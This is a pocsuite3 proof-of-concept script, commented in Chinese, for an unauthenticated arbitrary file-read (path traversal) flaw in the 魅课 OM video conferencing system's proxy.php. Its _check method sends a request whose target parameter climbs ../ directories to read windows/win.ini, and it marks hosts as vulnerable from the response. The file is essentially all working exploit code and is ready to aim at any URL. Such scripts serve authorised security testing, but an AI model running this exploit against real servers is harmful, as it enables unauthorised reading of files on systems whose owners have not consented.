from pocsuite3.api import (
    Output,
    POCBase,
    POC_CATEGORY,
    register_poc,
    requests,
    VUL_TYPE,
)


class OM_meeting(POCBase):
    vulID = "0"  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
    version = "1"  # 默认为1
    author = "小白"  # PoC作者的大名
    vulDate = "2022-07-17"  # 漏洞公开的时间,不知道就写今天
    createDate = "2022-07-17"  # 编写 PoC 的日期
    updateDate = "2022-07-17"  # PoC 更新的时间,默认和编写时间一样
    references = ["http://wiki.peiqi.tech/wiki/webapp/%E9%AD%85%E8%AF%BE%E4%BF%A1%E6%81%AF/%E9%AD%85%E8%AF%BE%20OM%E8%A7%86%E9%A2%91%E4%BC%9A%E8%AE%AE%E7%B3%BB%E7%BB%9F%20proxy.php%20%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E.html"]  # 漏洞地址来源,0day不用写
    name = "魅课 OM视频会议系统 proxy.php 文件包含漏洞"  # PoC 名称
    appPowerLink = ""  # 漏洞厂商主页地址
    appName = "魅课 OM视频会议系统"  # 漏洞应用名称
    appVersion = "ALL"  # 漏洞影响版本
    vulType = VUL_TYPE.ARBITRARY_FILE_READ  # 弱口令 漏洞类型,类型参考见 漏洞类型规范表
    category = POC_CATEGORY.EXPLOITS.WEBAPP  # poc对应的产品类型 web的
    # samples = []  # 测试样列,就是用 PoC 测试成功的网站
    # install_requires = []  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    desc = """魅课OM视频会议系统 proxy.php文件target参数存在本地文件包含漏洞。攻击者可借助该漏洞无需登录便可下载任意文件"""  # 漏洞简要描述
    pocDesc = """pocsuite -r .\pocs\*.py -u <url>"""  # POC用法描述

    def _check(self):
        result = []
        full_url = f"{self.url}/admin/do/proxy.php?method=get&target=../../../../../../../../../../windows/win.ini"
        cookies = {"PHPSESSID": "5b31b702e479e31fdd4d496f69786d9f"}
        headers = {"Cache-Control": "max-age=0", "DNT": "1", "Upgrade-Insecure-Requests": "1",
                   "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Safari/537.36 Edg/103.0.1264.62",
                   "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                   "Accept-Encoding": "gzip, deflate",
                   "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6", "Connection": "close"}
        try:
            response = requests.get(full_url, headers=headers, cookies=cookies,verify=False,timeout=10)
            if "[Mail]" in response.text:
                result.append(self.url)
        except Exception:
            pass
        finally:
            return result

    def _verify(self):
        result = {}
        res = self._check()  # res就是返回的结果列表
        if res:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['Info'] = self.name
            result['VerifyInfo']['vul_url'] = self.url
            result['VerifyInfo']['vul_detail'] = self.desc
        return self.parse_verify(result)

    def _attack(self):
        return self._verify()

    def parse_verify(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Target is not vulnerable')
        return output


def other_fuc():
    pass


def other_utils_func():
    pass


# 注册 DemoPOC 类
register_poc(OM_meeting)#



